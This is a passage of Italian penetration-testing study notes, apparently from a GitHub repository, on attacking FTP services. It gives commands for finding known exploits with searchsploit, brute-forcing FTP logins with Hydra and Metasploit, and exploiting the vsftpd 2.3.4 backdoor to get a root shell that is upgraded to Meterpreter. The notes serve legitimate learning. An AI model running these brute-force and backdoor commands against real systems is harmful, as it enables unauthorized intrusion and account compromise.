<a href="https://github.com/Gigidotexe/Penetration_Test_notes/blob/main/README.md"> Back </a>
## Ricerca Exploit noti
Dopo aver effettuata la scansione del servizio e la sua versione nella fase di Scansione ed Enumerazione, possiamo procedere con la ricerca di exploit noti usando <a href="https://www.exploit-db.com/">Ecploit Database</a> oppure: 
```bash
searchsploit <ftp-versione> 
```
> Se restituise un exploit utilizzabile, copia il path e usa `searchsploit -m <path>`

Verifica anche con degli script nse se il target é vunerabile a certi exploit noti: <br>
- `ftp-bounce` → verifica la vulnerabilità FTP bounce (obsoleta)   
- `ftp-proftpd-backdoor` → verifica exploit in ProFTPD  

---

## Brute force delle credenziali

Per tentare un brute force delle credenziali possiamo usare :
### Hydra
```
hydra -L <usernameList> -P <passwordList> <IP> -t 4 ftp
```

- `-L` specifica la lista di username  
- `-P` la wordlist delle password  
- `-t 4` imposta il numero di thread

Se le credenziali sono corrette, Hydra lo notificherà a schermo.

### Metapsloit
Modulo per brute force:

```
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <IP>
set USERNAME anonymous
run
```

---

## Connessione con credenziali valide

Dopo aver scoperto una coppia `user:pass`, accedi con:

```
ftp <IP>
```

Poi:

```
Name: <username>
Password: <password>
```
Dopo che abbiamo ottenuto una sessione nella macchina target, possiamo passare alla fase di Post Exploitation. 

---

## Exploiting bsftpd 2.3.4
Se durante la fase di Scansione ed enumerazione, la versione del servizio dovesse risultare `vsftpd 2.3.4`, possiamo procedere con l'exploitation di essa
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <IP>
run
```
riuscendo ad ottenre una shell `root` e quindi non abbiamo bisogno di effettuare privilege escalation <br>
possiamo upgradare la shell ottenuta con il comando: <br>
```bash
use post/multi/manage/shell_to_meterpreter
set LHOST <IP>
set SESSION <number>
run
```
> potrebbe dare in output un errore ma é normale

successivamente verrá creata una nuova sessione meterpeter. 
```bash
sessions
```
